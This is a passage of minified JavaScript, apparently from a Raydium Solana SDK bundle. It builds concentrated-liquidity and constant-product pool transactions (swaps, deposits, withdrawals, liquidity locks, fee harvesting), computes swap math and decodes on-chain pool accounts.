              ).publicKey.equals(y.pubkey) &&
              (f[y.accountInfo.mint.toString()] = y.pubkey)
            : (f[y.accountInfo.mint.toString()] = y.pubkey);
        let h = Object.values(e)
            .flat()
            .map((t) => t.nftMint),
          p = await xA(
            this.scope.connection,
            h.map((t) => ({ pubkey: t }))
          ),
          m = {};
        p.forEach((t) => {
          var e, n;
          m[t.pubkey.toBase58()] =
            null !=
            (n =
              null == (e = null == t ? void 0 : t.accountInfo)
                ? void 0
                : e.owner)
              ? n
              : null;
        });
        let g = this.createTxBuilder(c);
        for (let y of Object.values(t)) {
          if (
            void 0 === e[y.id] ||
            !e[y.id].find(
              (t) =>
                !t.liquidity.isZero() ||
                t.rewardInfos.find((t) => !t.rewardAmountOwed.isZero())
            )
          )
            continue;
          let t = y,
            s = r.useSOLBalance && t.mintA.address === zI.toString(),
            a = r.useSOLBalance && t.mintB.address === zI.toString(),
            u = f[t.mintA.address];
          if (!u) {
            let { account: e, instructionParams: n } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: t.mintA.programId,
                mint: new Xi(t.mintA.address),
                notUseTokenAccount: s,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !s,
                createInfo: {
                  payer: r.feePayer || this.scope.ownerPubKey,
                  amount: 0,
                },
                associatedOnly: !s && o,
                checkCreateATAOwner: i,
              });
            (u = e), n && g.addInstruction(n);
          }
          let c = f[t.mintB.address];
          if (!c) {
            let { account: e, instructionParams: n } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: t.mintB.programId,
                mint: new Xi(t.mintB.address),
                notUseTokenAccount: a,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !a,
                createInfo: {
                  payer: r.feePayer || this.scope.ownerPubKey,
                  amount: 0,
                },
                associatedOnly: !a && o,
                checkCreateATAOwner: i,
              });
            (c = e), n && g.addInstruction(n);
          }
          (f[t.mintA.address] = u), (f[t.mintB.address] = c);
          let h = [];
          for (let e of t.rewardDefaultInfos) {
            let t = r.useSOLBalance && e.mint.address === zI.toString(),
              n = f[e.mint.address];
            if (!n) {
              let { account: i, instructionParams: s } =
                await this.scope.account.getOrCreateTokenAccount({
                  tokenProgram: new Xi(e.mint.programId),
                  mint: new Xi(e.mint.address),
                  notUseTokenAccount: t,
                  owner: this.scope.ownerPubKey,
                  skipCloseAccount: !t,
                  createInfo: {
                    payer: r.feePayer || this.scope.ownerPubKey,
                    amount: 0,
                  },
                  associatedOnly: !t && o,
                });
              (n = i), s && g.addInstruction(s);
            }
            (f[e.mint.address] = n), h.push(n);
          }
          let p = await this.getClmmPoolKeys(t.id),
            w = [];
          for (let e = 0; e < p.rewardInfos.length; e++)
            w.push({
              poolRewardVault: new Xi(p.rewardInfos[e].vault),
              ownerRewardVault: h[e],
              rewardMint: new Xi(p.rewardInfos[e].mint.address),
            });
          for (let r of e[y.id]) {
            let e =
              null == (l = null == n ? void 0 : n[y.id])
                ? void 0
                : l[r.nftMint.toBase58()];
            if (e) {
              let t = h_(this.scope.ownerPubKey, e.lockNftMint, _c).publicKey,
                n = FB.getTickArrayStartIndexByTick(
                  r.tickLower,
                  p.config.tickSpacing
                ),
                o = FB.getTickArrayStartIndexByTick(
                  r.tickUpper,
                  p.config.tickSpacing
                ),
                { publicKey: i } = yB(new Xi(p.programId), e.poolId, n),
                { publicKey: s } = yB(new Xi(p.programId), e.poolId, o),
                { publicKey: a } = wB(
                  new Xi(p.programId),
                  e.poolId,
                  r.tickLower,
                  r.tickUpper
                ),
                l = _B(I_, e.lockNftMint).publicKey,
                d = iE.harvestLockPositionInstructionV2({
                  programId: I_,
                  auth: S_,
                  lockPositionId: l,
                  clmmProgram: k_,
                  lockOwner: this.scope.ownerPubKey,
                  lockNftMint: e.lockNftMint,
                  lockNftAccount: t,
                  positionNftAccount: e.nftAccount,
                  positionId: e.positionId,
                  poolId: e.poolId,
                  protocolPosition: a,
                  vaultA: new Xi(p.vault.A),
                  vaultB: new Xi(p.vault.B),
                  tickArrayLower: i,
                  tickArrayUpper: s,
                  userVaultA: u,
                  userVaultB: c,
                  mintA: new Xi(p.mintA.address),
                  mintB: new Xi(p.mintB.address),
                  rewardAccounts: w,
                  exTickArrayBitmap: kB(k_, e.poolId).publicKey,
                });
              g.addInstruction({
                instructions: [d],
                instructionTypes: [BS],
                lookupTableAddress: p.lookupTableAccount
                  ? [p.lookupTableAccount]
                  : [],
              });
            } else {
              let e = iE.decreaseLiquidityInstructions({
                poolInfo: t,
                poolKeys: p,
                ownerPosition: r,
                ownerInfo: {
                  wallet: this.scope.ownerPubKey,
                  tokenAccountA: u,
                  tokenAccountB: c,
                  rewardAccounts: h,
                },
                liquidity: new Zn(0),
                amountMinA: new Zn(0),
                amountMinB: new Zn(0),
                nft2022:
                  null == (d = m[r.nftMint.toBase58()]) ? void 0 : d.equals(Tc),
              });
              g.addInstruction(e);
            }
          }
        }
        return 0 === a
          ? g.sizeCheckBuildV0({ computeBudgetConfig: u })
          : g.sizeCheckBuild({ computeBudgetConfig: u });
      }
      async getWhiteListMint({ programId: t }) {
        let e = await this.scope.connection.getAccountInfo(AB(t).publicKey);
        return e
          ? $B
              .decode(e.data)
              .whitelistMints.filter((t) => !t.equals(Xi.default))
          : [];
      }
      async getOwnerPositionInfo({ programId: t }) {
        await this.scope.account.fetchWalletTokenAccounts();
        let e = this.scope.account.tokenAccountRawInfos
            .filter((t) => t.accountInfo.amount.eq(new Zn(1)))
            .map((e) => bB(new Xi(t), e.accountInfo.mint).publicKey),
          n = await this.scope.connection.getMultipleAccountsInfo(e),
          r = [];
        return (
          n.forEach((t) => {
            if (!t) return;
            let e = JB.decode(t.data);
            r.push(e);
          }),
          r
        );
      }
      async getRpcClmmPoolInfo({ poolId: t }) {
        return (await this.getRpcClmmPoolInfos({ poolIds: [t] }))[String(t)];
      }
      async getRpcClmmPoolInfos({ poolIds: t, config: e }) {
        let n = await xA(
            this.scope.connection,
            t.map((t) => ({ pubkey: new Xi(t) })),
            e
          ),
          r = {};
        for (let o = 0; o < t.length; o++) {
          let e = n[o];
          if (null === e || !e.accountInfo)
            throw Error("fetch pool info error: " + String(t[o]));
          let i = XB.decode(e.accountInfo.data),
            s = DB.sqrtPriceX64ToPrice(
              i.sqrtPriceX64,
              i.mintDecimalsA,
              i.mintDecimalsB
            ).toNumber();
          r[String(t[o])] = AA(vA({}, i), {
            currentPrice: s,
            programId: e.accountInfo.owner,
          });
        }
        return r;
      }
      async getComputeClmmPoolInfos({ clmmPoolsRpcInfo: t, mintInfos: e }) {
        let n = new Set(Object.keys(t).map((e) => t[e].ammConfig.toBase58())),
          r = await xA(
            this.scope.connection,
            Array.from(n).map((t) => ({ pubkey: new Xi(t) }))
          ),
          o = {};
        r.forEach((t) => {
          !t.accountInfo ||
            (o[t.pubkey.toBase58()] = jB.decode(t.accountInfo.data));
        });
        let i = await RB.fetchComputeMultipleClmmInfo({
          connection: this.scope.connection,
          rpcDataMap: t,
          poolList: Object.keys(t).map((n) => {
            var r, i, s, a;
            let [u, c] = [t[n].mintA.toBase58(), t[n].mintB.toBase58()];
            return {
              id: n,
              programId: t[n].programId.toBase58(),
              mintA: uE({
                address: u,
                decimals: t[n].mintDecimalsA,
                programId: e[u].programId.toBase58() || _c.toBase58(),
                extensions: {
                  feeConfig:
                    null != (r = e[u]) && r.feeConfig
                      ? cE(null == (i = e[u]) ? void 0 : i.feeConfig)
                      : void 0,
                },
              }),
              mintB: uE({
                address: c,
                decimals: t[n].mintDecimalsB,
                programId: e[c].programId.toBase58() || _c.toBase58(),
                extensions: {
                  feeConfig:
                    null != (s = e[c]) && s.feeConfig
                      ? cE(null == (a = e[c]) ? void 0 : a.feeConfig)
                      : void 0,
                },
              }),
              price: t[n].currentPrice,
              config: AA(vA({}, o[t[n].ammConfig.toBase58()]), {
                id: t[n].ammConfig.toBase58(),
                fundFeeRate: 0,
                description: "",
                defaultRange: 0,
                defaultRangePoint: [],
              }),
            };
          }),
        });
        return {
          computeClmmPoolInfo: i,
          computePoolTickData: await RB.fetchMultiplePoolTickArrays({
            connection: this.scope.connection,
            poolKeys: Object.values(i),
          }),
        };
      }
      async getPoolInfoFromRpc(t) {
        var e;
        let n = await this.getRpcClmmPoolInfo({ poolId: t }),
          r = new Set([n.mintA.toBase58(), n.mintB.toBase58()]),
          o = await OA({
            connection: this.scope.connection,
            mints: Array.from(r).map((t) => new Xi(t)),
          }),
          { computeClmmPoolInfo: i, computePoolTickData: s } =
            await this.scope.clmm.getComputeClmmPoolInfos({
              clmmPoolsRpcInfo: { [t]: n },
              mintInfos: o,
            }),
          a = await xA(this.scope.connection, [
            { pubkey: n.vaultA },
            { pubkey: n.vaultB },
          ]),
          u = (function (t) {
            return AA(vA({}, t), {
              type: "Concentrated",
              programId: t.programId.toString(),
              id: t.id.toString(),
              rewardDefaultInfos: [],
              rewardDefaultPoolInfos: "Clmm",
              price: t.currentPrice.toNumber(),
              mintAmountA: 0,
              mintAmountB: 0,
              feeRate: t.ammConfig.tradeFeeRate,
              openTime: t.startTime.toString(),
              tvl: 0,
              day: OB,
              week: OB,
              month: OB,
              pooltype: [],
              farmUpcomingCount: 0,
              farmOngoingCount: 0,
              farmFinishedCount: 0,
              burnPercent: 0,
              config: AA(vA({}, t.ammConfig), {
                id: t.ammConfig.id.toString(),
                defaultRange: 0,
                defaultRangePoint: [],
              }),
            });
          })(i[t]);
        if (!a[0].accountInfo || !a[1].accountInfo)
          throw new Error("pool vault data not found");
        return (
          (u.mintAmountA = Number(
            Yc.decode(a[0].accountInfo.data).amount.toString()
          )),
          (u.mintAmountB = Number(
            Yc.decode(
              null == (e = a[1].accountInfo) ? void 0 : e.data
            ).amount.toString()
          )),
          {
            poolInfo: u,
            poolKeys: AA(vA({}, i[t]), {
              exBitmapAccount: i[t].exBitmapAccount.toBase58(),
              observationId: i[t].observationId.toBase58(),
              id: t,
              programId: n.programId.toBase58(),
              openTime: n.startTime.toString(),
              vault: { A: n.vaultA.toBase58(), B: n.vaultB.toBase58() },
              config: u.config,
              rewardInfos: i[t].rewardInfos
                .filter((t) => !t.tokenVault.equals(Xi.default))
                .map((t) => ({
                  mint: uE({
                    address: t.tokenMint.toBase58(),
                    programId: _c.toBase58(),
                    decimals: 10,
                  }),
                  vault: t.tokenVault.toBase58(),
                })),
            }),
            computePoolInfo: i[t],
            tickData: s,
          }
        );
      }
    };
  function ZE(t, e) {
    if (e.isZero()) throw Error("divisor is zero");
    return t.mod(e);
  }
  var JE = new Zn(0),
    YE = class {
      static swapWithoutFees(t, e, n) {
        let r = e.mul(n),
          o = e.add(t),
          [i] = (function (t, e) {
            if (e.isZero()) throw Error("rhs is zero");
            let n = t.div(e);
            if (n.isZero()) throw Error("quotient is zero");
            let r = ZE(t, e);
            return (
              r.gt(JE) &&
                ((n = n.add(new Zn(1))),
                (e = t.div(n)),
                (r = ZE(t, n)),
                r.gt(JE) && (e = e.add(new Zn(1)))),
              [n, e]
            );
          })(r, o),
          s = n.sub(i);
        if (s.isZero()) throw Error("destinationAmountSwapped is zero");
        return { destinationAmountSwapped: s };
      }
      static lpTokensToTradingTokens(t, e, n, r, o) {
        let i = t.mul(n).div(e),
          s = t.mul(r).div(e);
        if (0 === o) return { tokenAmount0: i, tokenAmount1: s };
        if (1 === o)
          return (
            ZE(t.mul(n), e).gt(JE) && i.gt(JE) && (i = i.add(new Zn(1))),
            ZE(t.mul(r), e).gt(JE) && s.gt(JE) && (s = s.add(new Zn(1))),
            { tokenAmount0: i, tokenAmount1: s }
          );
        throw Error("roundDirection value error");
      }
    },
    QE = class {
      static tradingFee(t, e) {
        return rS(t, e, V_);
      }
      static protocolFee(t, e) {
        return oS(t, e, V_);
      }
      static fundFee(t, e) {
        return oS(t, e, V_);
      }
    },
    $E = ((t) => (
      (t[(t.Floor = 0)] = "Floor"), (t[(t.Ceiling = 1)] = "Ceiling"), t
    ))($E || {}),
    tx = class {
      static validate_supply(t, e) {
        if (t.isZero()) throw Error("tokenAmount0 is zero");
        if (e.isZero()) throw Error("tokenAmount1 is zero");
      }
      static swap(t, e, n, r) {
        let o = QE.tradingFee(t, r),
          i = t.sub(o),
          { destinationAmountSwapped: s } = YE.swapWithoutFees(i, e, n);
        return {
          newSwapDestinationAmount: n.sub(s),
          sourceAmountSwapped: t,
          destinationAmountSwapped: s,
          tradeFee: o,
        };
      }
      static swapBaseOut({
        poolMintA: t,
        poolMintB: e,
        tradeFeeRate: n,
        baseReserve: r,
        quoteReserve: o,
        outputMint: i,
        outputAmount: s,
      }) {
        let [a, u, c, l, d] =
            e.address === i.toString()
              ? [r, o, t.decimals, e.decimals, t.address]
              : [o, r, e.decimals, t.decimals, e.address],
          f = new dA(u.toString())
            .div(10 ** l)
            .div(new dA(a.toString()).div(10 ** c)),
          h = s.gte(u) ? u.sub(new Zn(1)) : s,
          p = u.sub(h),
          m = q_(a.mul(h), p),
          g = q_(m.mul(new Zn(1e6)), new Zn(1e6).sub(n)),
          y = g.sub(m),
          w = new dA(h.toString())
            .div(10 ** l)
            .div(new dA(g.toString()).div(10 ** c));
        return {
          amountRealOut: h,
          amountIn: g,
          amountInWithoutFee: m,
          tradeFee: y,
          priceImpact: f.isZero() ? 0 : w.sub(f).div(f).abs().toNumber(),
        };
      }
    },
    ex = ct.from("vault_and_lp_mint_auth_seed", "utf8");
  ct.from("amm_config", "utf8");
  var nx = ct.from("pool", "utf8"),
    rx = ct.from("pool_lp_mint", "utf8"),
    ox = ct.from("pool_vault", "utf8"),
    ix = ct.from("observation", "utf8");
  function sx(t) {
    return u_([ex], t);
  }
  function ax(t, e, n, r) {
    return u_([nx, e.toBuffer(), n.toBuffer(), r.toBuffer()], t);
  }
  function ux(t, e, n) {
    return u_([ox, e.toBuffer(), n.toBuffer()], t);
  }
  function cx(t, e) {
    return u_([ix, e.toBuffer()], t);
  }
  function lx({ poolId: t, programId: e, configId: n, mintA: r, mintB: o }) {
    let i = sx(e).publicKey,
      s = t || ax(e, n, r, o).publicKey,
      a = (function (t, e) {
        return u_([rx, e.toBuffer()], t);
      })(e, s).publicKey;
    return {
      poolId: s,
      configId: n,
      authority: i,
      lpMint: a,
      vaultA: ux(e, s, r).publicKey,
      vaultB: ux(e, s, o).publicKey,
      observationId: cx(e, s).publicKey,
    };
  }
  var dx = ct.from("locked_liquidity", "utf8");
  function fx(t, e) {
    return u_([dx, e.toBuffer()], t);
  }
  var hx = CA("Raydium_cpmm"),
    px = {
      initialize: [175, 175, 109, 31, 13, 152, 155, 237],
      deposit: [242, 35, 198, 137, 82, 225, 242, 182],
      withdraw: [183, 18, 70, 156, 148, 109, 161, 34],
      swapBaseInput: [143, 190, 90, 218, 196, 30, 51, 222],
      swapBaseOutput: [55, 217, 98, 86, 163, 74, 180, 173],
      lockCpLiquidity: [216, 157, 29, 78, 38, 51, 31, 26],
      collectCpFee: [8, 30, 51, 199, 209, 184, 247, 133],
    };
  function mx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y, w, b) {
    let v = VT([NT("amountMaxA"), NT("amountMaxB"), NT("openTime")]),
      A = ax(t, n, i, s).publicKey,
      k = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !o.equals(A), isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !1 },
        { pubkey: s, isSigner: !1, isWritable: !1 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
        { pubkey: f, isSigner: !1, isWritable: !0 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
        { pubkey: g, isSigner: !1, isWritable: !0 },
        { pubkey: _c, isSigner: !1, isWritable: !1 },
        { pubkey: p, isSigner: !1, isWritable: !1 },
        { pubkey: m, isSigner: !1, isWritable: !1 },
        { pubkey: Cc, isSigner: !1, isWritable: !1 },
        { pubkey: WI, isSigner: !1, isWritable: !1 },
        { pubkey: DI, isSigner: !1, isWritable: !1 },
      ],
      I = ct.alloc(v.span);
    return (
      v.encode({ amountMaxA: y, amountMaxB: w, openTime: b }, I),
      new ws({ keys: k, programId: t, data: ct.from([...px.initialize, ...I]) })
    );
  }
  function gx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p) {
    let m = VT([NT("lpAmount"), NT("amountMaxA"), NT("amountMaxB")]),
      g = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: _c, isSigner: !1, isWritable: !1 },
        { pubkey: Tc, isSigner: !1, isWritable: !1 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
      ],
      y = ct.alloc(m.span);
    return (
      hx.debug("cpmm deposit data", {
        lpAmount: f.toString(),
        amountMaxA: h.toString(),
        amountMaxB: p.toString(),
      }),
      m.encode({ lpAmount: f, amountMaxA: h, amountMaxB: p }, y),
      new ws({ keys: g, programId: t, data: ct.from([...px.deposit, ...y]) })
    );
  }
  function yx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p) {
    let m = VT([NT("lpAmount"), NT("amountMinA"), NT("amountMinB")]),
      g = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: _c, isSigner: !1, isWritable: !1 },
        { pubkey: Tc, isSigner: !1, isWritable: !1 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
        { pubkey: NI, isSigner: !1, isWritable: !1 },
      ],
      y = ct.alloc(m.span);
    return (
      m.encode({ lpAmount: f, amountMinA: h, amountMinB: p }, y),
      new ws({ keys: g, programId: t, data: ct.from([...px.withdraw, ...y]) })
    );
  }
  function wx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m) {
    let g = VT([NT("amountIn"), NT("amounOutMin")]),
      y = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
      ],
      w = ct.alloc(g.span);
    return (
      g.encode({ amountIn: p, amounOutMin: m }, w),
      new ws({
        keys: y,
        programId: t,
        data: ct.from([...px.swapBaseInput, ...w]),
      })
    );
  }
  function bx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m) {
    let g = VT([NT("amountInMax"), NT("amountOut")]),
      y = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !1 },
        { pubkey: l, isSigner: !1, isWritable: !1 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
      ],
      w = ct.alloc(g.span);
    return (
      g.encode({ amountInMax: p, amountOut: m }, w),
      new ws({
        keys: y,
        programId: t,
        data: ct.from([...px.swapBaseOutput, ...w]),
      })
    );
  }
  async function vx(t) {
    var e;
    let n,
      {
        ownerInfo: r,
        poolInfo: o,
        poolKeys: i,
        feeNftOwner: s,
        getEphemeralSigners: a,
      } = t,
      u = [],
      [c, l] = [new Xi(o.id), new Xi(o.lpMint.address)];
    if (a) n = new Xi((await a(1))[0]);
    else {
      let t = Hu.generate();
      u.push(t), (n = t.publicKey);
    }
    let { publicKey: d } = h_(s, n, _c),
      { publicKey: f } = vB(n),
      { publicKey: h } = fx(t.lockProgram, n),
      { publicKey: p } = h_(r.wallet, l, _c),
      { publicKey: m } = h_(t.lockAuthProgram, l, _c),
      g = (function ({
        programId: t,
        auth: e,
        payer: n,
        liquidityOwner: r,
        nftOwner: o,
        nftMint: i,
        nftAccount: s,
        poolId: a,
        lockPda: u,
        mintLp: c,
        userLpVault: l,
        lockLpVault: d,
        poolVaultA: f,
        poolVaultB: h,
        metadataAccount: p,
        lpAmount: m,
        withMetadata: g,
      }) {
        let y = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !0, isWritable: !1 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: i, isSigner: !0, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !1 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
          ],
          w = VT([NT("lpAmount"), zT("withMetadata")]),
          b = ct.alloc(w.span);
        w.encode({ lpAmount: m, withMetadata: g }, b);
        let v = ct.from([...px.lockCpLiquidity, ...b]);
        return new ws({ keys: y, programId: t, data: v });
      })({
        programId: t.lockProgram,
        auth: t.lockAuthProgram,
        payer: r.feePayer,
        liquidityOwner: r.wallet,
        nftOwner: s,
        nftMint: n,
        nftAccount: d,
        poolId: c,
        lockPda: h,
        mintLp: l,
        userLpVault: p,
        lockLpVault: m,
        poolVaultA: new Xi(i.vault.A),
        poolVaultB: new Xi(i.vault.B),
        metadataAccount: f,
        lpAmount: t.lpAmount,
        withMetadata: null == (e = t.withMetadata) || e,
      });
    return {
      address: {
        nftMint: n,
        nftAccount: d,
        metadataAccount: f,
        lockPda: h,
        userLpVault: p,
        lockLpVault: m,
      },
      instructions: [g],
      signers: u,
      instructionTypes: [t_],
      lookupTableAddress: [],
    };
  }
  function Ax({
    programId: t,
    nftOwner: e,
    auth: n,
    nftAccount: r,
    lockPda: o,
    poolId: i,
    mintLp: s,
    userVaultA: a,
    userVaultB: u,
    poolVaultA: c,
    poolVaultB: l,
    mintA: d,
    mintB: f,
    lockLpVault: h,
    lpFeeAmount: p,
    cpmmProgram: m,
    cpmmAuthProgram: g,
  }) {
    let y = [
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: null != m ? m : x_, isSigner: !1, isWritable: !1 },
        { pubkey: null != g ? g : P_, isSigner: !1, isWritable: !1 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: d, isSigner: !1, isWritable: !1 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
        { pubkey: _c, isSigner: !1, isWritable: !1 },
        { pubkey: Tc, isSigner: !1, isWritable: !1 },
        { pubkey: NI, isSigner: !1, isWritable: !1 },
      ],
      w = VT([NT("lpFeeAmount")]),
      b = ct.alloc(w.span);
    w.encode({ lpFeeAmount: p }, b);
    let v = ct.from([...px.collectCpFee, ...b]);
    return new ws({ keys: y, programId: t, data: v });
  }
  var kx = VT([
      ET(8),
      MT("bump"),
      zT("disableCreatePool"),
      ST("index"),
      NT("tradeFeeRate"),
      NT("protocolFeeRate"),
      NT("fundFeeRate"),
      NT("createPoolFee"),
      WT("protocolOwner"),
      WT("fundOwner"),
      HT(NT(), 16),
    ]),
    Ix = VT([
      ET(8),
      WT("configId"),
      WT("poolCreator"),
      WT("vaultA"),
      WT("vaultB"),
      WT("mintLp"),
      WT("mintA"),
      WT("mintB"),
      WT("mintProgramA"),
      WT("mintProgramB"),
      WT("observationId"),
      MT("bump"),
      MT("status"),
      MT("lpDecimals"),
      MT("mintDecimalA"),
      MT("mintDecimalB"),
      NT("lpAmount"),
      NT("protocolFeesMintA"),
      NT("protocolFeesMintB"),
      NT("fundFeesMintA"),
      NT("fundFeesMintB"),
      NT("openTime"),
      HT(NT(), 32),
    ]),
    Sx = class extends iT {
      constructor(t) {
        super(t);
      }
      async load() {
        this.checkDisabled();
      }
      async getCpmmPoolKeys(t) {
        return (await this.scope.api.fetchPoolKeysById({ idList: [t] }))[0];
      }
      async getRpcPoolInfo(t, e) {
        return (await this.getRpcPoolInfos([t], e))[t];
      }
      async getRpcPoolInfos(t, e) {
        let n = await xA(
            this.scope.connection,
            t.map((t) => ({ pubkey: new Xi(t) }))
          ),
          r = {},
          o = new Set(),
          i = [];
        for (let l = 0; l < t.length; l++) {
          let e = n[l];
          if (null === e.accountInfo)
            throw Error("fetch pool info error: " + String(t[l]));
          let s = Ix.decode(e.accountInfo.data);
          (r[String(t[l])] = AA(vA({}, s), { programId: e.accountInfo.owner })),
            o.add(String(s.configId)),
            i.push(s.vaultA, s.vaultB);
        }
        let s = {};
        if (e) {
          let t = [...o],
            e = await xA(
              this.scope.connection,
              t.map((t) => ({ pubkey: new Xi(t) }))
            );
          for (let n = 0; n < t.length; n++) {
            let r = e[n].accountInfo;
            if (null === r) throw Error("fetch pool config error: " + t[n]);
            s[t[n]] = kx.decode(r.data);
          }
        }
        let a = {},
          u = await xA(
            this.scope.connection,
            i.map((t) => ({ pubkey: new Xi(t) }))
          );
        for (let l = 0; l < i.length; l++) {
          let t = u[l].accountInfo;
          if (null === t) throw Error("fetch vault info error: " + i[l]);
          a[String(i[l])] = new Zn(Yc.decode(t.data).amount.toString());
        }
        let c = {};
        for (let [l, d] of Object.entries(r)) {
          let t = a[d.vaultA.toString()]
              .sub(d.protocolFeesMintA)
              .sub(d.fundFeesMintA),
            e = a[d.vaultB.toString()]
              .sub(d.protocolFeesMintB)
              .sub(d.fundFeesMintB);
          c[l] = AA(vA({}, d), {
            baseReserve: t,
            quoteReserve: e,
            vaultAAmount: a[d.vaultA.toString()],
            vaultBAmount: a[d.vaultB.toString()],
            configInfo: s[d.configId.toString()],
            poolPrice: new mI(e.toString())
              .div(new mI(10).pow(d.mintDecimalB))
              .div(new mI(t.toString()).div(new mI(10).pow(d.mintDecimalA))),
          });
        }
        return c;
      }
      toComputePoolInfos({ pools: t, mintInfos: e }) {
        return Object.keys(t).reduce((n, r) => {
          var o, i, s, a;
          let u = t[r],
            [c, l] = [u.mintA.toBase58(), u.mintB.toBase58()];
          return AA(vA({}, n), {
            [r]: AA(vA({}, u), {
              id: new Xi(r),
              configInfo: u.configInfo,
              version: 7,
              authority: sx(u.programId).publicKey,
              mintA: uE({
                address: c,
                decimals: u.mintDecimalA,
                programId: u.mintProgramA.toBase58(),
                extensions: {
                  feeConfig:
                    null != (o = e[c]) && o.feeConfig
                      ? cE(null == (i = e[c]) ? void 0 : i.feeConfig)
                      : void 0,
                },
              }),
              mintB: uE({
                address: l,
                decimals: u.mintDecimalB,
                programId: u.mintProgramB.toBase58(),
                extensions: {
                  feeConfig:
                    null != (s = e[l]) && s.feeConfig
                      ? cE(null == (a = e[l]) ? void 0 : a.feeConfig)
                      : void 0,
                },
              }),
            }),
          });
        }, {});
      }
      async getPoolInfoFromRpc(t) {
        let e = await this.getRpcPoolInfo(t, !0),
          n = await OA({
            connection: this.scope.connection,
            mints: [e.mintA, e.mintB],
          }),
          r = uE({
            address: e.mintA.toBase58(),
            decimals: e.mintDecimalA,
            programId: e.mintProgramA.toBase58(),
            extensions: {
              feeConfig: n[e.mintA.toBase58()].feeConfig
                ? cE(n[e.mintA.toBase58()].feeConfig)
                : void 0,
            },
          }),
          o = uE({
            address: e.mintB.toBase58(),
